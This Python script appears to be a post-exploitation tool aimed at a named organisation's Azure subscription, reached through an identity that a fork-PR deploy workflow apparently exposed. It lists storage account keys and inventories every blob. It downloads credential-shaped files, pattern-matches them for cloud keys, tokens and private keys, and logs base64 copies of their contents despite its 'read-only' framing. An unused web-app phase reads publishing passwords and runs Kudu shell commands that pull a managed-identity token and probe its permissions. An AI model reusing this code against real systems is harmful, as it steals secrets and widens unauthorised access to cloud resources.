#!/usr/bin/env python3
"""C211-I121768 v2: READ-ONLY Azure blob data-plane inventory (sizes + prefix search) on subscription b8b18dcf,
reached with the SSW.Rules '/deploy' fork-PR OIDC ARM identity.

Creates, modifies and deletes NOTHING. It only:
  S1  listKeys each pre-existing storage account (read-only action) and, with SharedKey,
      read blob service properties, enumerate containers (with metadata/publicAccess),
      page through EVERY blob of every container recording name+size+content-type+last-modified
      aggregates, list file shares / queues / tables, and fetch only credential-shaped small blobs
      (base64+sha256 metadata + regex classification, never the raw value in the log).
  W1  read each web app's identity block, its publishing credentials (list = read, no rotation),
      its connection strings, and its site config.
  W2  with the SCM/publish credential, attempt a bounded READ-ONLY Kudu measurement
      (/api/settings + one /api/command that prints env var NAMES only). If the Kudu process
      exposes IDENTITY_ENDPOINT/IDENTITY_HEADER or MSI_ENDPOINT/MSI_SECRET, a single in-Kudu
      shell command fetches that app identity's ARM token and performs a bounded ARM read
      (subscriptions list + permissions + compute usages); the token never leaves the Kudu
      process and is never printed (only length/sha256 prefix are emitted).
stdlib only.
"""
import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET

ARM = "https://management.azure.com"
SID = os.environ.get("C211_SID", "b8b18dcf-d83b-47e2-9886-00c2e983629e")
TAG = "C211_I121768"
DEADLINE = int(os.environ.get("C211_DEADLINE", "900"))
T0 = time.time()

MAX_PAGES = 20
MAX_CRED_FETCH_PER_ACCOUNT = 24
MAX_BLOB_BYTES = 262144
MAX_JS_SCAN = 8

SITES = [
    ("SSW.Rules", "app-sswrules-prod"),
    ("SSW.Rules.Staging", "app-sswrules-staging"),
    ("SSW.Rules.Tina.Staging", "ssw-rules-tina-staging"),
    ("SSW.Rules.Tina.Prod", "ssw-rules-tina-production"),
]

CRED_NAME = re.compile(
    r"(publishsettings|\.pubxml|pubxml|appsettings[\w.-]*\.json|local\.settings\.json|"
    r"\.env(\.|$)|credential|secret|password|\.pem$|\.pfx$|\.p12$|id_rsa|id_dsa|"
    r"kubeconfig|\.kube|\.tfstate|terraform|deployment|deploy[-_.]|\.zip$|\.log$|"
    r"\.config$|\.git-credentials|\.netrc|token|sas|connectionstring)", re.I)
CRED_STRONG = re.compile(
    r"(publishsettings|pubxml|appsettings|local\.settings|\.env($|\.)|\.pem$|\.pfx$|\.p12$|"
    r"id_rsa|kubeconfig|\.tfstate|\.netrc|\.git-credentials|"
    r"(credential|secret|token|password|sas)[\w.-]*\.(json|txt|xml|yaml|yml|config|props|properties)$)",
    re.I)
# fetches are restricted to a tighter set: config/credential/archive artifacts only
FETCH_NAME = re.compile(
    r"(publishsettings|\.pubxml|appsettings[\w.-]*\.json|local\.settings\.json|"
    r"\.env(\.|$)|credential|secret|password|\.pem$|\.pfx$|\.p12$|id_rsa|"
    r"kubeconfig|\.tfstate|\.zip$|\.log$|\.config$|\.netrc|\.git-credentials)", re.I)

VALUE_PATTERNS = [
    ("aws_akid", re.compile(r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b")),
    ("github_pat", re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}\b")),
    ("github_pat_fine", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{40,}\b")),
    ("gitlab_pat", re.compile(r"\bglpat-[A-Za-z0-9_-]{18,}\b")),
    ("gcp_sa_json", re.compile(r'"type"\s*:\s*"service_account"')),
    ("gcp_api_key", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("private_key", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("azure_client_secret", re.compile(r"(client_secret|ClientSecret|AZURE_CLIENT_SECRET)\s*[=:]\s*\S{16,}")),
    ("sb_conn", re.compile(r"Endpoint=sb://[^\s\"]+sharedaccesskey=", re.I)),
    ("cosmos_key", re.compile(r"AccountEndpoint=https://[^\s\"]+AccountKey=", re.I)),
    ("storage_conn", re.compile(r"DefaultEndpointsProtocol=https?;AccountName=", re.I)),
    ("sas_token", re.compile(r"\b(sig|sv)=[A-Za-z0-9%]{20,}&?")),
    ("openai_key", re.compile(r"\bsk-[A-Za-z0-9]{32,}\b")),
    ("sql_conn", re.compile(r"(Server=tcp:|Data Source=)[^;\"]{3,};[^\"]*(Password|Pwd)=", re.I)),
    ("jwt", re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}")),
]


def emit(obj):
    try:
        print(TAG + " " + json.dumps(obj, default=str)[:11000], flush=True)
    except Exception:  # noqa: BLE001
        print(TAG + ' {"step":"emit-error"}', flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def http(url, method="GET", body=None, headers=None, timeout=60, data_bytes=None):
    data = data_bytes if data_bytes is not None else (
        json.dumps(body).encode() if body is not None else None)
    hdrs = dict(headers or {})
    if data is not None and "Content-Type" not in hdrs:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            return r.status, dict(r.headers), raw
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
        except Exception:  # noqa: BLE001
            raw = b""
        return e.code, dict(e.headers or {}), raw
    except Exception as e:  # noqa: BLE001
        return 0, {}, str(e).encode()


def jbody(raw):
    try:
        return json.loads(raw.decode("utf-8", "replace"))
    except Exception:  # noqa: BLE001
        return {"_raw": raw[:500].decode("utf-8", "replace")}


def arm(tok, url, method="GET", body=None, timeout=90):
    st, hd, raw = http(url, method=method, body=body,
                       headers={"Authorization": "Bearer " + tok}, timeout=timeout)
    return st, jbody(raw)


def sha256_hex(b):
    if isinstance(b, str):
        b = b.encode()
    return hashlib.sha256(b).hexdigest()


def classify(v):
    hits = []
    for name, pat in VALUE_PATTERNS:
        m = pat.search(v)
        if m:
            frag = m.group(0)
            hits.append({"kind": name, "len": len(frag), "sha256": sha256_hex(frag)})
    return hits


def record_value(store, ref, value, extra=None):
    if value is None:
        return
    if not isinstance(value, str):
        value = json.dumps(value, sort_keys=True)
    o = {"step": "VALUE", "store": store, "ref": ref, "len": len(value),
         "sha256": sha256_hex(value),
         "b64": base64.b64encode(value.encode()).decode()[:6000],
         "matches": classify(value)}
    if extra:
        o.update(extra)
    emit(o)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return 1, "", str(e)


def get_arm_token():
    for args in (["az", "account", "get-access-token", "--resource",
                  "https://management.azure.com", "-o", "json"],
                 ["az", "account", "get-access-token", "-o", "json"]):
        rc, out, err = run(args, timeout=120)
        try:
            d = json.loads(out)
        except Exception:  # noqa: BLE001
            d = {}
        tok = d.get("accessToken") or d.get("access_token")
        emit({"step": "arm-token", "rc": rc, "has_token": bool(tok),
              "err": (err or "")[:200]})
        if tok:
            return tok
    return None


# ---------------------------------------------------------------- storage
def shared_key_headers(account, key_b64, method, url, extra_headers=None, content_len=0):
    key = base64.b64decode(key_b64)
    parsed = urllib.parse.urlsplit(url)
    date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    canon_headers = {"x-ms-date": date, "x-ms-version": "2021-08-06"}
    for k, v in (extra_headers or {}).items():
        lk = k.lower()
        if lk.startswith("x-ms-"):
            canon_headers[lk] = v
    ch = "".join(f"{k}:{canon_headers[k].strip()}\n" for k in sorted(canon_headers))
    parts = []
    for k, v in sorted(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True),
                       key=lambda kv: kv[0]):
        parts.append(f"{k.lower()}:{v}")
    canon_res = f"/{account}{parsed.path}"
    if parts:
        canon_res += "\n" + "\n".join(parts)
    sts = "\n".join([method, "", "", str(content_len) if content_len else "", "",
                     "", "", "", "", "", "", "", ch + canon_res])
    sig = base64.b64encode(hmac.new(key, sts.encode(), hashlib.sha256).digest()).decode()
    hdrs = dict(canon_headers)
    hdrs["Authorization"] = f"SharedKey {account}:{sig}"
    return hdrs


def table_headers(account, key_b64, method, url):
    """Table service StringToSign: VERB\\nContent-MD5\\nContent-Type\\nDate\\nCanonicalizedResource."""
    key = base64.b64decode(key_b64)
    parsed = urllib.parse.urlsplit(url)
    date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    canon_res = f"/{account}{parsed.path}"
    q = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if q:
        canon_res += "\n" + "\n".join(f"{k.lower()}:{v}" for k, v in sorted(q, key=lambda kv: kv[0]))
    sts = "\n".join([method, "", "", date, canon_res])
    sig = base64.b64encode(hmac.new(key, sts.encode(), hashlib.sha256).digest()).decode()
    return {"x-ms-date": date, "x-ms-version": "2019-02-02", "Accept": "application/json",
            "Authorization": f"SharedKey {account}:{sig}"}


def xml_tags(raw, tag):
    out = []
    try:
        root = ET.fromstring(raw)
    except Exception:  # noqa: BLE001
        return out
    for c in root.iter():
        if c.tag.endswith(tag):
            out.append(c)
    return out


def child_text(el, name):
    for ch in el:
        if ch.tag.endswith(name):
            return ch.text
    return None


def phase_storage(tok):
    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/"
                     f"Microsoft.Storage/storageAccounts?api-version=2023-01-01")
    accts = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        p = x.get("properties") or {}
        accts.append({"name": x.get("name"), "loc": x.get("location"),
                      "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                      "kind": x.get("kind"), "sku": (x.get("sku") or {}).get("name"),
                      "allowSharedKey": p.get("allowSharedKeyAccess"),
                      "pna": p.get("publicNetworkAccess")})
    emit({"step": "S1-accounts", "http": st, "n": len(accts), "accounts": accts})
    for a in accts:
        if left() < 120:
            emit({"step": "S1-skip", "account": a["name"], "why": "deadline"})
            continue
        acct = a["name"]
        keyurl = (f"{ARM}/subscriptions/{SID}/resourceGroups/{urllib.parse.quote(a['rg'])}"
                  f"/providers/Microsoft.Storage/storageAccounts/{acct}/listKeys"
                  "?api-version=2023-01-01")
        stk, bk = arm(tok, keyurl, method="POST", body={})
        keys = (bk.get("keys") or []) if isinstance(bk, dict) else []
        key1 = keys[0].get("value") if keys else None
        emit({"step": "S1-listkeys", "account": acct, "http": stk, "n_keys": len(keys),
              "key_sha256": sha256_hex(key1) if key1 else None,
              "key_len": len(key1) if key1 else None,
              "err": (bk.get("error") or {}).get("code") if isinstance(bk, dict) else None})
        if not key1:
            continue
        blob = f"https://{acct}.blob.core.windows.net"
        # service properties
        u = blob + "/?restype=service&comp=properties"
        sp, _, spr = http(u, headers=shared_key_headers(acct, key1, "GET", u), timeout=45)
        emit({"step": "S1-blobprops", "account": acct, "http": sp,
              "body": spr[:300].decode("utf-8", "replace") if sp != 200 else "ok"})
        # containers with metadata
        u = blob + "/?comp=list&include=metadata"
        sc, _, raw = http(u, headers=shared_key_headers(acct, key1, "GET", u), timeout=45)
        conts = []
        for c in xml_tags(raw, "Container"):
            conts.append({"name": child_text(c, "Name"),
                          "publicAccess": child_text(c, "PublicAccess"),
                          "lastModified": child_text(c, "LastModified"),
                          "lease": child_text(c, "LeaseStatus"),
                          "meta_keys": [ch.tag.split("}")[-1] for ch in c
                                        if ch.tag.split("}")[-1] == "Metadata"
                                        for ch in ch]})
        emit({"step": "S1-containers", "account": acct, "http": sc, "n": len(conts),
              "containers": conts[:40],
              "err": None if sc == 200 else raw[:250].decode("utf-8", "replace")})
        # anonymous container-list probe (no key)
        san, _, _ = http(blob + "/?comp=list", timeout=30)
        emit({"step": "S1-anon-list", "account": acct, "http": san})
        tot = {"account": acct, "containers": len(conts), "blobs": 0, "bytes": 0,
               "cred_names": [], "fetched": 0, "matches": 0}
        for ci, c in enumerate(conts[:20]):
            cn = c["name"]
            if not cn or left() < 100:
                continue
            marker = None
            pages = 0
            n = 0
            size_total = 0
            ext = {}
            cred = []
            first = None
            last = None
            ct_set = set()
            lm_min = None
            lm_max = None
            while pages < MAX_PAGES:
                u2 = (blob + f"/{urllib.parse.quote(cn)}?restype=container&comp=list"
                      "&include=metadata&maxresults=5000")
                if marker:
                    u2 += "&marker=" + urllib.parse.quote(marker)
                sb, _, rawb = http(u2, headers=shared_key_headers(acct, key1, "GET", u2),
                                   timeout=60)
                if sb != 200:
                    emit({"step": "S1-list-err", "account": acct, "container": cn,
                          "http": sb, "page": pages,
                          "body": rawb[:250].decode("utf-8", "replace")})
                    break
                for be in xml_tags(rawb, "Blob"):
                    nm = child_text(be, "Name")
                    if not nm:
                        continue
                    n += 1
                    if first is None:
                        first = nm
                    last = nm
                    props_el = None
                    for ch in be:
                        if ch.tag.endswith("Properties"):
                            props_el = ch
                    sz = child_text(props_el, "Content-Length") if props_el is not None else None
                    try:
                        sz = int(sz)
                        size_total += sz
                    except Exception:  # noqa: BLE001
                        sz = None
                    ctx = (child_text(props_el, "ContentType") if props_el is not None else "") or ""
                    ct_set.add(ctx[:60])
                    e = nm.rsplit("/", 1)[-1]
                    e = ("." + e.rsplit(".", 1)[-1].lower()) if "." in e else "(none)"
                    ext[e] = ext.get(e, 0) + 1
                    lm = child_text(props_el, "Last-Modified") if props_el is not None else None
                    if lm:
                        lm_min = lm if lm_min is None else min(lm_min, lm)
                        lm_max = lm if lm_max is None else max(lm_max, lm)
                    if CRED_STRONG.search(nm) and len(cred) < 200:
                        cred.append({"name": nm, "size": sz})
                nm_el = None
                try:
                    root = ET.fromstring(rawb)
                    for ch in root:
                        if ch.tag.endswith("NextMarker"):
                            nm_el = ch.text
                except Exception:  # noqa: BLE001
                    nm_el = None
                pages += 1
                if not nm_el:
                    marker = None
                    break
                marker = nm_el
            ext_top = sorted(ext.items(), key=lambda kv: -kv[1])[:14]
            emit({"step": "S1-inventory", "account": acct, "container": cn,
                  "pages": pages, "truncated": bool(marker),
                  "n": n, "bytes": size_total, "ext": ext_top,
                  "first": first, "last": last, "ct": sorted(ct_set)[:6],
                  "lm_min": lm_min, "lm_max": lm_max,
                  "cred_n": len(cred), "cred": cred[:60]})
            # definitive prefix search for credential-shaped object names
            pre_hits = []
            if left() > 100:
                for pre in ("appsettings", ".env", "publishsettings", "local.settings",
                            "credentials", "secrets", "secret", "id_rsa", "web.config",
                            "appsettings.json", "deploy"):
                    u6 = (blob + f"/{urllib.parse.quote(cn)}?restype=container&comp=list"
                          f"&prefix={urllib.parse.quote(pre)}&maxresults=1000")
                    s6, _, raw6 = http(u6, headers=shared_key_headers(acct, key1, "GET", u6),
                                       timeout=45)
                    got = []
                    for be in xml_tags(raw6, "Blob"):
                        nm6 = child_text(be, "Name")
                        pr6 = None
                        for ch in be:
                            if ch.tag.endswith("Properties"):
                                pr6 = ch
                        sz6 = child_text(pr6, "Content-Length") if pr6 is not None else None
                        if nm6:
                            got.append({"name": nm6, "size": sz6})
                    pre_hits.append({"prefix": pre, "http": s6, "n": len(got), "names": got[:12]})
                    if len(got) and not CRED_STRONG.search(got[0]["name"]):
                        pass
            emit({"step": "S1-prefix", "account": acct, "container": cn,
                  "probes": pre_hits})
            tot["blobs"] += n
            tot["bytes"] += size_total
            tot["cred_names"].extend([x["name"] for x in cred])
            # fetch credential-shaped objects (tight pattern, size cap)
            fetch = [x for x in cred if FETCH_NAME.search(x["name"])]
            for x in fetch:
                if left() < 90 or tot["fetched"] >= MAX_CRED_FETCH_PER_ACCOUNT:
                    break
                if x["size"] is not None and x["size"] > MAX_BLOB_BYTES:
                    emit({"step": "S1-fetch-skip", "account": acct, "container": cn,
                          "blob": x["name"], "size": x["size"], "why": "too-large"})
                    continue
                u3 = blob + f"/{urllib.parse.quote(cn)}/{urllib.parse.quote(x['name'], safe='/')}"
                s3, h3, raw3 = http(u3, headers=shared_key_headers(acct, key1, "GET", u3),
                                    timeout=60)
                tot["fetched"] += 1
                m = classify(raw3.decode("utf-8", "replace"))
                if m:
                    tot["matches"] += 1
                emit({"step": "S1-fetch", "account": acct, "container": cn,
                      "blob": x["name"], "http": s3, "len": len(raw3),
                      "sha256": sha256_hex(raw3), "matches": m,
                      "b64": base64.b64encode(raw3).decode()[:4000] if len(raw3) <= 32768 else None})
            # bounded JS scan only for $web static bundles (public content)
            if cn == "$web" and left() > 120:
                jsblobs = []
                u4 = (blob + f"/{urllib.parse.quote(cn)}?restype=container&comp=list"
                      "&maxresults=5000")
                s4, _, raw4 = http(u4, headers=shared_key_headers(acct, key1, "GET", u4),
                                   timeout=60)
                if s4 == 200:
                    for be in xml_tags(raw4, "Blob"):
                        nm = child_text(be, "Name") or ""
                        sz = child_text(be, "Content-Length")
                        try:
                            sz = int(sz)
                        except Exception:  # noqa: BLE001
                            continue
                        if nm.endswith(".js") and sz <= 131072:
                            jsblobs.append((nm, sz))
                for nm, sz in jsblobs[:MAX_JS_SCAN]:
                    if left() < 80:
                        break
                    u5 = blob + f"/{urllib.parse.quote(cn)}/{urllib.parse.quote(nm, safe='/')}"
                    s5, _, raw5 = http(u5, headers=shared_key_headers(acct, key1, "GET", u5),
                                       timeout=45)
                    m = classify(raw5.decode("utf-8", "replace"))
                    emit({"step": "S1-jsscan", "account": acct, "blob": nm, "http": s5,
                          "len": len(raw5), "sha256": sha256_hex(raw5), "matches": m})
        # other storage services
        for svc, url, hdrfn in (
            ("file", f"https://{acct}.file.core.windows.net/?comp=list", shared_key_headers),
            ("queue", f"https://{acct}.queue.core.windows.net/?comp=list", shared_key_headers),
            ("table", f"https://{acct}.table.core.windows.net/Tables", table_headers),
        ):
            if left() < 70:
                break
            hs = hdrfn(acct, key1, "GET", url)
            ss, _, raws = http(url, headers=hs, timeout=45)
            names = []
            for tag in ("Share", "Queue", "Table"):
                for e in xml_tags(raws, tag):
                    nm = child_text(e, "Name")
                    if nm:
                        names.append(nm)
            emit({"step": "S1-service", "account": acct, "svc": svc, "http": ss,
                  "n": len(names), "names": names[:20],
                  "body": None if ss == 200 else raws[:220].decode("utf-8", "replace")})
        tot["cred_names"] = tot["cred_names"][:80]
        emit({"step": "S1-summary", **tot})


# ---------------------------------------------------------------- web apps
def kudu_call(scm, user, pw, method, path, body=None, timeout=60):
    url = f"https://{scm}{path}"
    import base64 as _b64
    auth = _b64.b64encode(f"{user}:{pw}".encode()).decode()
    hdrs = {"Authorization": "Basic " + auth, "Accept": "application/json"}
    st, hd, raw = http(url, method=method, body=body, headers=hdrs, timeout=timeout)
    return st, raw


def phase_web(tok):
    for rg, site in SITES:
        if left() < 120:
            emit({"step": "W-skip", "site": site, "why": "deadline"})
            continue
        base = (f"{ARM}/subscriptions/{SID}/resourceGroups/{rg}/providers/"
                f"Microsoft.Web/sites/{site}")
        st, s = arm(tok, base + "?api-version=2022-03-01")
        props = (s.get("properties") or {}) if isinstance(s, dict) else {}
        ident = (s.get("identity") or {}) if isinstance(s, dict) else {}
        emit({"step": "W-site", "site": site, "http": st, "state": props.get("state"),
              "kind": s.get("kind") if isinstance(s, dict) else None,
              "reserved": props.get("reserved"),
              "identity": {"type": ident.get("type"), "principalId": ident.get("principalId"),
                           "tenantId": ident.get("tenantId"),
                           "uamis": list(((ident.get("userAssignedIdentities") or {}).keys()))},
              "https_only": props.get("httpsOnly"),
              "defaultHost": props.get("defaultHostName")})
        # role assignments of the site identity (read-only)
        if ident.get("principalId"):
            pid = ident["principalId"]
            st2, ra = arm(tok, f"{ARM}/subscriptions/{SID}/providers/Microsoft.Authorization/"
                                f"roleAssignments?$filter=principalId%20eq%20'{pid}'"
                                "&api-version=2022-04-01")
            rows = []
            for r in ((ra.get("value") or []) if isinstance(ra, dict) else []):
                p = r.get("properties") or {}
                rows.append({"role": p.get("roleDefinitionId", "").split("/")[-1],
                             "scope": p.get("scope")})
            emit({"step": "W-site-ra", "site": site, "principalId": pid, "http": st2,
                  "n": len(rows), "rows": rows[:10]})
            for k in ("uamis",):
                pass
        # publishing credentials (list = read, does not rotate)
        pub = base + "/config/publishingcredentials/list?api-version=2022-03-01"
        stp, bp = arm(tok, pub, method="POST", body={})
        pprops = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
        user = pprops.get("publishingUserName")
        pw = pprops.get("publishingPassword")
        emit({"step": "W-publish", "site": site, "http": stp,
              "user": user, "pw_len": len(pw) if pw else None,
              "pw_sha256": sha256_hex(pw) if pw else None,
              "err": (bp.get("error") or {}).get("code") if isinstance(bp, dict) else None})
        # connection strings (read)
        csurl = base + "/config/connectionstrings/list?api-version=2022-03-01"
        stc, bc = arm(tok, csurl, method="POST", body={})
        cs = []
        for x in ((bc.get("properties") or []) if isinstance(bc, dict) else []):
            v = x.get("value")
            cs.append({"name": x.get("name"), "type": x.get("type"),
                       "len": len(v) if v else 0,
                       "sha256": sha256_hex(v) if v else None,
                       "matches": classify(v or "")})
        emit({"step": "W-connstrings", "site": site, "http": stc, "n": len(cs), "cs": cs[:20]})
        if not (user and pw):
            continue
        hosts = [f"{site}.scm.azurewebsites.net"]
        for scm in hosts:
            st1, raw1 = kudu_call(scm, user, pw, "GET", "/api/settings")
            ks = []
            try:
                d1 = json.loads(raw1.decode("utf-8", "replace"))
                ks = sorted(list(d1.keys()))[:40]
            except Exception:  # noqa: BLE001
                d1 = {}
            emit({"step": "W-kudu-settings", "site": site, "scm": scm, "http": st1,
                  "n": len(d1) if isinstance(d1, dict) else 0, "keys": ks,
                  "body": None if st1 == 200 else raw1[:200].decode("utf-8", "replace")})
            if st1 != 200:
                continue
            cmd = ("env | sed 's/=.*//' | sort | grep -Ei "
                   "\"IDENTITY|MSI|WEBSITE|AZURE|APPSETTING|HOSTING\" | head -60")
            st2, raw2 = kudu_call(scm, user, pw, "POST", "/api/command",
                                  {"command": cmd, "dir": "/"})
            out = None
            try:
                d2 = json.loads(raw2.decode("utf-8", "replace"))
                out = d2.get("Output") or ""
                err2 = d2.get("Error") or ""
            except Exception:  # noqa: BLE001
                d2 = {}
                err2 = ""
            names = [x.strip() for x in (out or "").splitlines() if x.strip()]
            emit({"step": "W-kudu-env", "site": site, "http": st2,
                  "exit": d2.get("ExitCode") if isinstance(d2, dict) else None,
                  "names": names[:60], "err": (err2 or "")[:200],
                  "body": None if st2 == 200 else raw2[:200].decode("utf-8", "replace")})
            has_identity = any(x.upper().startswith(("IDENTITY_ENDPOINT", "MSI_ENDPOINT"))
                               for x in names)
            emit({"step": "W-kudu-identity-vars", "site": site, "has_identity": has_identity})
            if not has_identity:
                continue
            # single bounded in-Kudu measurement; token never leaves the process
            script = (
                'TOK=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" '
                '"${IDENTITY_ENDPOINT}?resource=https%3A%2F%2Fmanagement.azure.com&api-version=2019-08-01"); '
                'if [ -z "$TOK" ]; then TOK=$(curl -s -H "Secret: $MSI_SECRET" '
                '"${MSI_ENDPOINT}?resource=https%3A%2F%2Fmanagement.azure.com&api-version=2017-09-01"); fi; '
                'AT=$(printf %s "$TOK" | sed -n "s/.*\\"access_token\\":\\"\\([^\\"]*\\)\\".*/\\1/p"); '
                'echo "C211I768 TOKLEN=${#AT}"; '
                'echo "C211I768 TOKSHA=$(printf %s "$AT" | sha256sum | cut -c1-16)"; '
                'B=$(curl -s -H "Authorization: Bearer $AT" '
                '"https://management.azure.com/subscriptions?api-version=2022-12-01"); '
                'echo "C211I768 SUBS=$(printf %s "$B" | tr -d "\\n" | head -c 500)"; '
                'S=$(printf %s "$B" | sed -n "s/.*\\"subscriptionId\\":\\"\\([^\\"]*\\)\\".*/\\1/p"); '
                'for s in $S; do '
                'P=$(curl -s -H "Authorization: Bearer $AT" '
                '"https://management.azure.com/subscriptions/$s/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"); '
                'echo "C211I768 PERM-$s=$(printf %s "$P" | tr -d "\\n" | head -c 700)"; done')
            st3, raw3 = kudu_call(scm, user, pw, "POST", "/api/command",
                                  {"command": "bash -c '" + script + "'", "dir": "/"},
                                  timeout=120)
            out3 = ""
            try:
                d3 = json.loads(raw3.decode("utf-8", "replace"))
                out3 = (d3.get("Output") or "") + "\n--ERR--\n" + (d3.get("Error") or "")
            except Exception:  # noqa: BLE001
                out3 = raw3.decode("utf-8", "replace")[:800]
            keep = [ln for ln in out3.splitlines() if "C211I768" in ln or "--ERR--" in ln]
            emit({"step": "W-kudu-msi", "site": site, "http": st3,
                  "lines": [x[:900] for x in keep[:12]]})
            break


def main():
    emit({"step": "START", "intent": 121768, "sub": SID,
          "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())})
    tok = get_arm_token()
    if not tok:
        emit({"step": "FATAL", "why": "no-arm-token"})
        return
    st, sub = arm(tok, f"{ARM}/subscriptions/{SID}?api-version=2022-12-01")
    emit({"step": "S0-sub", "http": st,
          "displayName": sub.get("displayName") if isinstance(sub, dict) else None,
          "state": sub.get("state") if isinstance(sub, dict) else None})
    for fn in (phase_storage,):
        if left() < 60:
            emit({"step": "SKIP", "fn": fn.__name__, "left": int(left())})
            continue
        try:
            fn(tok)
        except Exception as e:  # noqa: BLE001
            emit({"step": "phase-error", "fn": fn.__name__, "err": str(e)[:400]})
    emit({"step": "DONE", "elapsed_s": int(time.time() - T0), "left": int(left())})


if __name__ == "__main__":
    main()
